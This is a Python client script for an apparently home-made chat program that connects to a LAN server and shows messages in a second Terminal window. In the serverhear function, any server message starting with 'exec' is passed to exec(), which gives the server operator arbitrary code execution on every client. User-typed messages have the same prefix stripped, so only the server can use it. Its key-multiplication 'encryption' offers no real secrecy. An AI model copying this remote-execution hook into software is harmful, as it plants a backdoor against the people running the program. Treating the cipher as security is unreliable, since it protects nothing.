#!/usr/bin/env python
import socket, random, os, threading, subprocess
from multiprocessing import Process

KEY = 97531

def encode_with_key(string):#Encrypting and decrypting
    list_of_numbers = ''
    for letter in string:
        list_of_numbers += str(ord(letter)*KEY) + ' '
    return list_of_numbers.encode()

def decode_with_key(byte):
    string_of_bytes = ''
    list_of_bytes = (byte.decode('utf-8')).split()
    for b in list_of_bytes:
        string_of_bytes += chr(int(int(b)//KEY))
    return string_of_bytes

def prelines(serverconnect):
    pass

def displines(serverconnect, displayconnect):
    pass

def userhost(serverconnect):
    msg = socket.gethostname()
    lenofmsg = str(len(str(encode_with_key(msg))))
    lenofmsg = ('0' * (3-len(lenofmsg))) + str(lenofmsg)
    serverconnect.send(lenofmsg.encode())
    serverconnect.send(encode_with_key(msg))
    correct = 0
    print('Username must be 10 or less characters.')
    while not correct:
        msg = input('What is your username: ')
        if len(msg) > 10 or len(msg) == 0:
            print('Username must be 10 characters or less.')
            continue
        lenofmsg = str(len(str(encode_with_key(msg))))
        lenofmsg = ('0' * (2-len(lenofmsg))) + str(lenofmsg)
        serverconnect.send(lenofmsg.encode())
        serverconnect.send(encode_with_key(msg))
        print('sent!')
        correct = int(serverconnect.recv(1).decode('utf-8'))
        print('there we go')
        if not correct:
            print('Someone has that username.')

def typing(serverconnect):
    try:
        print('typing now')
        while True:
            msg = str(input(': '))
            if msg[:4:] == 'exec':
                msg = msg[4::]
            print('after check exec')
            lenofmsg = str(len(str(encode_with_key(msg))))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            print('after len of msg')
            serverconnect.send(lenofmsg.encode())
            serverconnect.send(encode_with_key(msg))
    except:
        print('Connection interuppted or broken. Server may be under maintenance.')
        todisplay.close()
        serverconnect.close()
        raise SystemExit

def serverhear(serverconnect, displayconnect):
    print('in hear')
    while True:
        lenofmsg = int(serverconnect.recv(5).decode('utf-8'))
        msg = decode_with_key(serverconnect.recv(lenofmsg))
        if msg[:4] == 'exec':
            exec(msg[5:])
        else:
            lenofmsg = str(len(str(msg)))
            lenofmsg = ('0' * (5-len(lenofmsg))) + str(lenofmsg)
            displayconnect.send(str(lenofmsg).encode())
            displayconnect.send(msg.encode())

try:
    #ip = '127.0.0.1'
    ip = '192.168.7.226'
    port = 10001
    toserver = socket.socket()
    toserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
    toserver.connect((ip, port))
except Exception as e:
    print('It looks like you aren\'t on WiFi or the server is under maintenance.')
    print(e)
    raise SystemExit

#Security
print('before security')
#lenofmsg = int(toserver.recv(5).decode('utf-8'))
#msg = decode_with_key(toserver.recv(lenofmsg))
#if msg[:4] == 'exec':
    #exec(msg[5:])
print('after security')

prelines(toserver)

ip = '127.0.0.1'
port = 7500
connect = socket.socket()
connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)#To not get Errno [48] port in use
connect.bind((ip, port))
connect.listen(1)

userhost(toserver)

pathtodir = os.path.dirname(os.path.abspath(__file__))
os.system("osascript -e \'tell application \"Terminal\" to do script \"python3 {path}/IMDisplay.py\"\'".format(path = pathtodir))
print('should be opened')
todisplay, addr = connect.accept()

displines(toserver, todisplay)
print('there')
#talktoserv = threading.Thread(target=typing, args=(toserver))
talktodisp = threading.Thread(target=serverhear, args=(toserver, todisplay), daemon=True)
print('in between')
talktodisp.start()
typing(toserver)
print('out of here')
#typing(toserver)
#serverhear(toserver, todisplay)
